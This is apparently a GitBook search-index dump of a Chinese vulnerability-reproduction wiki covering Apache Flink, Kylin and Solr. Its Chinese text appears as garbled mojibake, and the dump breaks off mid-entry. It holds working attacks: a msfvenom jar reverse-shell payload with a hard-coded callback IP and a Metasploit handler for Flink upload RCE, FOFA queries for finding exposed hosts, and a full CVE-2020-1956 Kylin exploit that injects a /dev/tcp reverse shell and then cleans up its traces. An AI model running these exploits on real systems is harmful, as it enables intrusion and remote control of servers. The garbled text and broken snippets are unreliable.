{"./":{"url":"./","title":"å…³äºæ–‡åº“","keywords":"","body":"PeiQI WiKiæ–‡åº“ğŸ‘ å…³äºæ–‡åº“ å¦‚ä»Šæ¼æ´çš„å„ç§å¤ç°æ–‡ç« å·²ç»å¡«æ»¡äº†äº’è”ç½‘ï¼Œä½†æ˜¯æ¯æ¬¡å»å°è¯•æ¼æ´å¤ç°æ—¶ï¼Œæ€»ä¼šçº ç»“äºç¯å¢ƒæ­å»ºï¼ŒPOCå’Œæ¼æ´åŸç†ä¸Šã€‚ ç”±äºè¿™äº›å› ç´ ï¼Œé€šå¸¸éƒ½éœ€è¦ç¿»é˜…å¾ˆå¤šå¾ˆå¤šçš„æ–‡ç« æ‰èƒ½ç†è§£è¿™ä¸ªæ¼æ´ï¼Œäºæ˜¯ï¼Œä¾¿èŒç”Ÿäº†æŠŠç¯å¢ƒæ­å»ºï¼ŒPOCï¼Œæ¼æ´åŸç†å…¨éƒ¨é›†åˆåœ¨ä¸€ä¸ªæ–‡åº“çš„æƒ³æ³•ï¼ŒPeiQI WiKiæ–‡åº“ä¾¿ç”±æ­¤è€Œæ¥ğŸ‘» å…³äºä½¿ç”¨ æ–‡åº“ä½¿ç”¨çš„æ˜¯Gitbookï¼Œå› ä¸ºé£æ ¼æ¯”è¾ƒæ¸…æ–°ï¼Œç®€æ´ã€‚äºæ˜¯ä¾¿é€‰æ‹©äº†å®ƒæ¥æ­å»ºæ–‡åº“ã€‚ ç›®å‰Wikiæ–‡åº“æ˜¯å¼€æºçš„ï¼Œæ¯ä¸€ä¸ªäººéƒ½å¯ä»¥ä¸‹è½½éšæ—¶ç¿»é˜…ğŸ¬ Githubé“¾æ¥ ç äº‘é“¾æ¥ [!NOTE] POCæ–‡ä»¶éƒ½å­˜æ”¾äºæ¼æ´åˆ†ç±»åçš„ç›®å½•ä¸­ [!NOTE] ç½‘ç«™ç›®å½•ä¸Šæ–¹æ”¯æŒæ­£åˆ™æœç´¢å…³é”®å­—å¿«é€ŸæŸ¥çœ‹ [!NOTE] è¾¹æ¡†å¯ä»¥è°ƒæ•´ï¼Œå­—ä½“å¤§å°å’ŒèƒŒæ™¯ä¹Ÿæ”¯æŒæ›´æ¢ å¦‚ä½•æœ¬åœ°ä½¿ç”¨ [!NOTE] 1.Github æ‹‰å–ä»£ç  git clone https://gitee.com/yelisenyu/wiki.git git clone https://github.com/PeiQi0/wiki.git 2.ä¸‹è½½ gitbook apt install npm npm install gitbook-cli -g 3.æ‰“å¼€Wikiçš„ç›®å½•ä¸‹æ‰§è¡Œ gitbook serve 4.è®¿é—® http://localhost:4000 å³å¯ æœ€å ç›®å‰æ–‡åº“ç”±æˆ‘ä¸€äººç»´æŠ¤ä¸­ï¼Œå› ä¸ºæ–‡åº“ä¸ªäººé£æ ¼åŸå› æš‚ä¸æ¥å—å¸ˆå‚…ä»¬çš„æŠ•ç¨¿ã€‚ä¸è¿‡å¸ˆå‚…ä»¬å¯ä»¥æå‡ºæ–‡åº“æ”¹è‰¯çš„æ„è§ç»™æˆ‘ã€‚ [!NOTE] åˆ«å¿˜äº†Githubä¸‹è½½å®Œç»™ä¸ªå°æ˜Ÿæ˜Ÿâ­ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-04 23:28:20 "},"PeiQi_Wiki/middleware_wiki/":{"url":"PeiQi_Wiki/middleware_wiki/","title":"ä¸­é—´ä»¶æ¼æ´","keywords":"","body":"ä¸­é—´ä»¶æ¼æ´æ•´ç†ğŸ¦” PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-03 14:36:20 "},"PeiQi_Wiki/middleware_wiki/Apache/":{"url":"PeiQi_Wiki/middleware_wiki/Apache/","title":"Apache","keywords":"","body":"Apache æ¼æ´æ•´ç†ğŸ‘» Apache Flink Apache Flink Apache Kylin Apache kylin æœªæˆæƒé…ç½®æ³„éœ² CVE-2020-13937 Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956 Apache Solr Apache Solr è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2019-0193 Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558 Apache Solr RCE è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2017-12629 Apache Solr XXE æ¼æ´ CVE-2017-12629 Apache Solr JMXæœåŠ¡ RCE CVE-2019-12409 Apache Solr RCE æœªæˆæƒä¸Šä¼ æ¼æ´ CVE-2020-13957 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-06 15:17:03 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Flink/":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Flink/","title":"Apache Flink ","keywords":"","body":"Apache Flink Apache Flink PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-01 00:16:41 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Flink/Apache=1.9.1è¿œç¨‹ä»£ç æ‰§è¡Œ.html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Flink/Apache=1.9.1è¿œç¨‹ä»£ç æ‰§è¡Œ.html","title":"Apache Flink  <= 1.9.1(æœ€æ–°ç‰ˆæœ¬) è¿œç¨‹ä»£ç æ‰§è¡Œ ","keywords":"","body":"Apache Flink æ¼æ´æè¿° è¿‘æ—¥,æœ‰å®‰å…¨ç ”ç©¶å‘˜å…¬å¼€äº†ä¸€ä¸ªApache Flinkçš„ä»»æ„JaråŒ…ä¸Šä¼ å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œçš„æ¼æ´. å½±å“èŒƒå›´ Apache Flink FOFA FOFA è¯­å¥ app=\"Apache-Flink\" && country=\"CN\" å›½å†…è¿˜æ˜¯å¾ˆå¤šä½¿ç”¨ Apache Flink çš„ï¼Œå¤§æ¦‚æœ‰1000çš„æ•°é‡å·¦å³ æ¼æ´å¤ç° éšä¾¿æ‰“å¼€ä¸€ä¸ªä½¿ç”¨ Apache Flink çš„ç½‘ç«™ï¼Œæ‰“å¼€åé¡µé¢ä¸ºè¿™æ ·å­ ç‚¹å‡»æŸ¥çœ‹æ–‡ä»¶ä¸Šä¼ é¡µé¢ æ‰“å¼€MSF ç”Ÿæˆä¸€ä¸ª jar æœ¨é©¬ msfvenom -p java/meterpreter/reverse_tcp LHOST=39.99.135.123 LPORT=4444 -f jar > test.jar ç‚¹å‡» Add ä¸Šä¼  jar æ–‡ä»¶ ç›‘å¬ç«¯å£ msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) > set payload java/shell/reverse_tcp payload => java/shell/reverse_tcp msf6 exploit(multi/handler) > set lhost xxx.xxx.xxx.xxx lhost => xxx.xxx.xxx.xxx msf6 exploit(multi/handler) > set lport 4444 lport => 4444 msf6 exploit(multi/handler) > run ç‚¹å‡»ä¸‹ submit åå¼¹å›æ¥ä¸€ä¸ªroot æƒé™shell æ¼æ´æ£€æµ‹POC import requests def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Flink >> http://xxx.xxx.xxx.xxx:9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/jars/upload\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \"Unable to load requested file /jars/upload.\" in response.text: print(\"\\033[32m[o] å¯èƒ½å­˜åœ¨ Apache Flink >> \\033[0m\")) POC_1(target_url) ä¿®å¤æ–¹æ³• å…³é—­æ–‡ä»¶ä¸Šä¼ è°ƒè¯•æ¨¡å— PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-03 17:55:25 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Kylin/":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Kylin/","title":"Apache Kylin","keywords":"","body":"Apache Kylin Apache-kylin æœªæˆæƒé…ç½®æ³„éœ² CVE-2020-13937 Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-06 15:17:20 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Kylin/Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ².html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Kylin/Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ².html","title":"Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ²","keywords":"","body":"Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ² CVE-2020-13937 FOFA app=\"APACHE-kylin\" å—å½±å“çš„ç‰ˆæœ¬ï¼š Apache Kylin æœ‰ä¸€ä¸ªrestful apiä¼šåœ¨æ²¡æœ‰è®¤å¯è®¤è¯çš„æƒ…å†µä¸‹æš´éœ²é…ç½®ä¿¡æ¯ã€‚ Kylin 2.x.x Kylin Kylin 4.0.0-alpha æ¼æ´åˆ©ç”¨ æ ¹æ®æ¼æ´æƒ…æŠ¥ æ¼æ´åˆ©ç”¨POCä¸ºhttp://xxx.xxx.xxx.xxx/kylin/api/admin/config æ¼æ´æ£€æµ‹POC import requests def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Kylin 2.x.x >> http://xxx.xxx.xxx.xxx:9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/kylin/api/admin/config\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \"config\" in response.text: print(\"\\033[32m[o] å­˜åœ¨Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ²\\n[o] å“åº”ä¸º:\\n\\033[0m\",response.text) else: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") except: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) å‚è€ƒ CVE-2020-13937|Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ²æ¼æ´ï¼Œè…¾è®¯å®‰å…¨å…¨é¢æ”¯æŒæ£€æµ‹ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-03 18:26:58 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Kylin/Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956.html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Kylin/Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956.html","title":"Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956","keywords":"","body":"Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956 æ¼æ´æè¿° 2020å¹´5æœˆ22æ—¥ï¼ŒCNVD é€šæŠ¥äº† Apache Kylin å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956ï¼Œåœ°å€åœ¨ http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202005-1133 ã€‚ Apache Kylin æ˜¯ç¾å›½ Apache è½¯ä»¶åŸºé‡‘ä¼šçš„ä¸€æ¬¾å¼€æºçš„åˆ†å¸ƒå¼åˆ†æå‹æ•°æ®ä»“åº“ã€‚è¯¥äº§å“ä¸»è¦æä¾› Hadoop/Spark ä¹‹ä¸Šçš„ SQL æŸ¥è¯¢æ¥å£åŠå¤šç»´åˆ†æï¼ˆOLAP**ï¼‰ç­‰åŠŸèƒ½ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Kylin 2.3.0 ~ 2.3.2 Apache Kylin 2.4.0 ~ 2.4.1 Apache Kylin 2.5.0 ~ 2.5.2 Apache Kylin 2.6.0 ~ 2.6.5 Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1 ç¯å¢ƒæ­å»º è¿™é‡Œä½¿ç”¨ docker æ¥æ­å»ºéœ€è¦çš„ç¯å¢ƒ Kylinå®˜æ–¹æ–‡æ¡£ docker pull apachekylin/apache-kylin-standalone:3.0.1 [!NOTE] å¦‚æœæœåŠ¡å™¨å†…å­˜è¾ƒå°ï¼Œå¯ä¸é€‰æ‹© -m 8G å‚æ•° docker run -d \\ -m 8G \\ -p 7070:7070 \\ -p 8088:8088 \\ -p 50070:50070 \\ -p 8032:8032 \\ -p 8042:8042 \\ -p 16010:16010 \\ apachekylin/apache-kylin-standalone:3.0.1 æ‰“å¼€åä½¿ç”¨é»˜è®¤è´¦å·å¯†ç admin/KYLINç™»å½•ï¼Œå‡ºç°åˆå§‹ç•Œé¢å³ä¸ºæˆåŠŸ æ¼æ´åˆ†æ æŸ¥çœ‹è¿™ä¸ªæ¼æ´ä¿®å¤çš„è¡¥ä¸ æŸ¥çœ‹åœ°å€ è¿™é‡Œå¯ä»¥çœ‹åˆ°æ­¤æ¼æ´æœ‰å…³çš„å‚æ•°æœ‰ä¸‰ä¸ªï¼Œåˆ†åˆ«æ˜¯ srcCfgUriã€dstCfgUriã€projectNameï¼Œç›¸å…³çš„å‡½æ•°ä¸º migrateCube å®˜æ–¹æ–‡æ¡£ä¸­å¯¹ migrateCube çš„æè¿° POST /kylin/api/cubes/{cube}/{project}/migrate ä¸‹è½½ Apache Kylin 3.0.1 çš„æºä»£ç è¿›è¡Œä»£ç å®¡è®¡,å‡ºç°æ¼æ´å‡½æ•°çš„æ–‡ä»¶ä¸ºä»¥ä¸‹è·¯å¾„ apache-kylin-3.0.1\\server-base\\src\\main\\java\\org\\apache\\kylin\\rest\\service\\CubeService.java æ‰¾åˆ°migrateCubeå‡½æ•° @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\") public void migrateCube(CubeInstance cube, String projectName) { KylinConfig config = cube.getConfig(); if (!config.isAllowAutoMigrateCube()) { throw new InternalErrorException(\"One click migration is disabled, please contact your ADMIN\"); } for (CubeSegment segment : cube.getSegments()) { if (segment.getStatus() != SegmentStatusEnum.READY) { throw new InternalErrorException( \"At least one segment is not in READY state. Please check whether there are Running or Error jobs.\"); } } String srcCfgUri = config.getAutoMigrateCubeSrcConfig(); String dstCfgUri = config.getAutoMigrateCubeDestConfig(); Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), \"Source configuration should not be empty.\"); Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri), \"Destination configuration should not be empty.\"); String stringBuilderstringBuilder = (\"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\"); String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri, cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge()); logger.info(\"One click migration cmd: \" + cmd); CliCommandExecutor exec = new CliCommandExecutor(); PatternedLogger patternedLogger = new PatternedLogger(logger); try { exec.execute(cmd, patternedLogger); } catch (IOException e) { throw new InternalErrorException(\"Failed to perform one-click migrating\", e); } } PreAuthorizeé‡Œé¢å®šä¹‰äº†è·¯ç”±æƒé™ï¼ŒADMINæƒé™ã€ADMINISTRATIONæƒé™å’ŒMANAGEMENTæƒé™å¯ä»¥è®¿é—®è¯¥serviceã€‚ @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\") åœ¨1087è¡Œåˆ¤æ–­æ˜¯å¦å¼€å¯äº†MigrateCubeè®¾ç½®ï¼Œå¦‚æœæ²¡æœ‰å¼€å¯åˆ™ä¼šæŠ¥é”™ è·Ÿè¿› isAllowAutoMigrateCube() è¿™ä¸ªå‡½æ•° å¯ä»¥çœ‹åˆ°è¿™é‡Œé»˜è®¤çš„é…ç½®kylin.tool.auto-migrate-cube.enabled å°±æ˜¯Flase public boolean isAllowAutoMigrateCube() { return Boolean.parseBoolean(getOptional(\"kylin.tool.auto-migrate-cube.enabled\", FALSE)); } åœ¨æ²¡æœ‰å¼€å¯é…ç½®kylin.tool.auto-migrate-cube.enabledä¸ºtrueçš„æƒ…å†µä¸‹ï¼Œè°ƒç”¨MigrateCubeåˆ™ä¼šå‡ºç°æŠ¥é”™ é€šè¿‡Apache Kylinçš„SYSTEMæ¨¡å—å¼€å¯kylin.tool.auto-migrate-cube.enabledä¸ºTrue è®¾ç½®åå†å»è¯·æ±‚åˆ™ä¸ä¼šå‡ºç°åˆšåˆšçš„æŠ¥é”™ï¼Œè€Œæ˜¯å‡ºç°Source configuration should not be empty è·Ÿè¿›å‡ºç°æŠ¥é”™è¯­å¥çš„ä»£ç å— String srcCfgUri = config.getAutoMigrateCubeSrcConfig(); String dstCfgUri = config.getAutoMigrateCubeDestConfig(); Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), \"Source configuration should not be empty.\"); Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri), \"Destination configuration should not be empty.\"); è¿™é‡Œè¿›è¡Œäº†å¯¹kylin.tool.auto-migrate-cube.src-configå’Œkylin.tool.auto-migrate-cube.dest-configçš„é…ç½®è¿›è¡Œäº†æ£€æµ‹ ,å¦‚æœä¸ºç©ºåˆ™ä¼šå‡ºç°åˆšåˆšçš„æŠ¥é”™ è·Ÿè¿› getAutoMigrateCubeSrcConfig()å’ŒgetAutoMigrateCubeDestConfig()å‡½æ•° public String getAutoMigrateCubeSrcConfig() { return getOptional(\"kylin.tool.auto-migrate-cube.src-config\", \"\"); } public String getAutoMigrateCubeDestConfig() { return getOptional(\"kylin.tool.auto-migrate-cube.dest-config\", \"\"); } å‘ç°è¿™ä¸¤ä¸ªé…ç½®é»˜è®¤ä¸ºç©ºï¼Œå› ä¸ºé…ç½®å…è®¸è‡ªå®šä¹‰ï¼Œæ‰€ä»¥srcCfgUriå’ŒdstCfgUriä¸¤ä¸ªå˜é‡å‡æ˜¯å¯æ§çš„ ç»§ç»­å‘ä¸‹èµ°ï¼Œå‘ç°ä¸€å¤„å‘½ä»¤æ‹¼æ¥ String stringBuilder = (\"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\"); String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri, cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge()); logger.info(\"One click migration cmd: \" + cmd); CliCommandExecutor exec = new CliCommandExecutor(); PatternedLogger patternedLogger = new PatternedLogger(logger); try { exec.execute(cmd, patternedLogger); } catch (IOException e) { throw new InternalErrorException(\"Failed to perform one-click migrating\", e); } } è¿›å…¥åˆ°executeå‡½æ•° private Pair runRemoteCommand(String command, Logger logAppender) throws IOException { SSHClient ssh = new SSHClient(remoteHost, port, remoteUser, remotePwd); SSHClientOutput sshOutput; try { sshOutput = ssh.execCommand(command, remoteTimeoutSeconds, logAppender); int exitCode = sshOutput.getExitCode(); String output = sshOutput.getText(); return Pair.newPair(exitCode, output); } catch (IOException e) { throw e; } catch (Exception e) { throw new IOException(e.getMessage(), e); } } private Pair runNativeCommand(String command, Logger logAppender) throws IOException { String[] cmd = new String[3]; String osName = System.getProperty(\"os.name\"); if (osName.startsWith(\"Windows\")) { cmd[0] = \"cmd.exe\"; cmd[1] = \"/C\"; } else { cmd[0] = \"/bin/bash\"; cmd[1] = \"-c\"; } cmd[2] = command; ProcessBuilder builder = new ProcessBuilder(cmd); builder.redirectErrorStream(true); Process proc = builder.start(); BufferedReader reader = new BufferedReader( new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8)); String line; StringBuilder result = new StringBuilder(); while ((line = reader.readLine()) != null && !Thread.currentThread().isInterrupted()) { result.append(line).append('\\n'); if (logAppender != null) { logAppender.log(line); } } if (Thread.interrupted()) { logger.info(\"CliCommandExecutor is interruppted by other, kill the sub process: \" + command); proc.destroy(); try { Thread.sleep(1000); } catch (InterruptedException e) { // do nothing } return Pair.newPair(1, \"Killed\"); } try { int exitCode = proc.waitFor(); return Pair.newPair(exitCode, result.toString()); } catch (InterruptedException e) { Thread.currentThread().interrupt(); throw new IOException(e); } } } ç”±æ­¤å¯ä»¥å¾—å‡ºæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸¤ä¸ªå¯æ§çš„å‚æ•°ï¼Œæ‰§è¡Œä»»æ„æˆ‘ä»¬éœ€è¦çš„å‘½ä»¤ï¼Œä¾‹å¦‚åå¼¹ä¸€ä¸ªshellï¼Œè®¾ç½®çš„é…ç½®ä¸º [!NOTE] kylin.tool.auto-migrate-cube.enabled=true kylin.tool.auto-migrate-cube.src-config=echo;bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 kylin.tool.auto-migrate-cube.dest-config=shell å†å»å‘é€POSTè¯·æ±‚ /kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate æˆåŠŸåå¼¹ä¸€ä¸ªshell æ¼æ´åˆ©ç”¨POC [!NOTE] POCåˆ©ç”¨å‰ææ˜¯æ‹¥æœ‰è´¦å·å¯†ç ï¼Œé»˜è®¤è´¦å·å¯†ç æ˜¯ admin/KYLIN #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Kylin >> http://xxx.xxx.xxx.xxx:7070 \\033[0m') print('+ \\033[36mLogin >>> admin:KYLIN(æ ¼å¼ä¸ºUser:Pass) \\033[0m') print('+------------------------------------------') def POC_1(target_url): login_url = target_url + \"/kylin/api/user/authentication\" user_pass = str(input(\"\\033[35mPlease input User and Pass\\nLogin >>> \\033[0m\")) Authorization = \"Basic \" + str((base64.b64encode(user_pass.encode('utf-8'))),'utf-8') headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Cookie\": \"project=null\" } try: response = requests.post(url=login_url, headers=headers, timeout=20) if \"password\" not in response.text: print(\"\\033[31m[x] è´¦å·å¯†ç å‡ºç°é”™è¯¯ \\033[0m\") sys.exit(0) else: print(\"\\033[32m[o] æˆåŠŸç™»å½•ï¼Œè·å¾—JSESSIONIDï¼š\" + response.cookies[\"JSESSIONID\"] + \"\\033[0m\") return response.cookies[\"JSESSIONID\"],Authorization except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, cookie, IP, PORT, Authorization): config_url = target_url + \"/kylin/api/admin/config\" key = [\"kylin.tool.auto-migrate-cube.enabled\",\"kylin.tool.auto-migrate-cube.src-config\",\"kylin.tool.auto-migrate-cube.dest-config\"] value = [\"true\",\"echo;bash -i >& /dev/tcp/{}/{} 0>&1;echo\".format(IP, PORT), \"shell\"] headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Accept\": \"application/json, text/plain, */*\", \"Content-Type\": \"application/json;charset=UTF-8\", \"Pragma\": \"no-cache\", \"Cookie\": \"project=null;JSESSIONID=\"+cookie } for i in range(0,3): data = \"\"\"{\"key\":\"%s\",\"value\":\"%s\"}\"\"\" % (key[i], value[i]) try: response = requests.put(url=config_url, headers=headers, data=data, timeout=20) if response.status_code == 200: print(\"\\033[32m[o] æˆåŠŸå°†\" + key[i] +\"è®¾ç½®ä¸º\" + value[i] +\"\\033[0m\") else: print(\"\\033[31m[x] è®¾ç½®\" + key[i] +\"ä¸º\" + value[i] +\"å¤±è´¥\\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") sys.exit(0) def POC_3(target_url, cookie): print(\"\\033[35m[o] æ­£åœ¨åå¼¹shell......\\033[0m\") vuln_url = target_url + \"/kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"project=null;JSESSIONID=\" + cookie } try: response = requests.post(url=vuln_url, headers=headers) POC_4(target_url, cookie) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") sys.exit(0) def POC_4(target_url, cookie): config_url = target_url + \"/kylin/api/admin/config\" key = [\"kylin.tool.auto-migrate-cube.enabled\", \"kylin.tool.auto-migrate-cube.src-config\", \"kylin.tool.auto-migrate-cube.dest-config\"] value = [\"flase\", \"echo;echo;echo\", \"None\"] headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Accept\": \"application/json, text/plain, */*\", \"Content-Type\": \"application/json;charset=UTF-8\", \"Pragma\": \"no-cache\", \"Cookie\": \"project=null;JSESSIONID=\" + cookie } for i in range(0,3): data = \"\"\"{\"key\":\"%s\",\"value\":\"%s\"}\"\"\" % (key[i], value[i]) try: response = requests.put(url=config_url, headers=headers, data=data, timeout=20) if response.status_code == 200: print(\"\\033[32m[o] æˆåŠŸå°†\" + key[i] +\"è®¾ç½®ä¸º\" + value[i] +\"\\033[0m\") else: print(\"\\033[31m[x] è®¾ç½®\" + key[i] +\"ä¸º\" + value[i] +\"å¤±è´¥\\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") sys.exit(0) print(\"\\033[35m[o] æˆåŠŸæ¸…ç†ç—•è¿¹\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) try: cookie,Authorization = POC_1(target_url) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") sys.exit(0) IP = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬PORT >>> \\033[0m\")) POC_2(target_url, cookie, IP, PORT, Authorization) POC_3(target_url, cookie) å‚è€ƒæ–‡ç«  Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956 POC åˆ†æ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-07 00:12:46 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/","title":"Apache Solr","keywords":"","body":"Apache Solr Apache Solr RCE è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2019-0193 Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558 Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2017-12629 Apache Solr XXE æ¼æ´ CVE-2017-12629 Apache Solr JMXæœåŠ¡ RCE CVE-2019-12409 Apache Solr RCE æœªæˆæƒä¸Šä¼ æ¼æ´ CVE-2020-13957 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-05 22:50:31 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2019-0193.html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2019-0193.html","title":"Apache Solr è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2019-0193","keywords":"","body":"Apache Solr è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2019-0193 æ¼æ´æè¿° 2019 å¹´ 08 æœˆ 01 æ—¥ï¼ŒApache Solr å®˜æ–¹å‘å¸ƒé¢„è­¦ï¼ŒApache Solr DataImport åŠŸèƒ½ åœ¨å¼€å¯ Debug 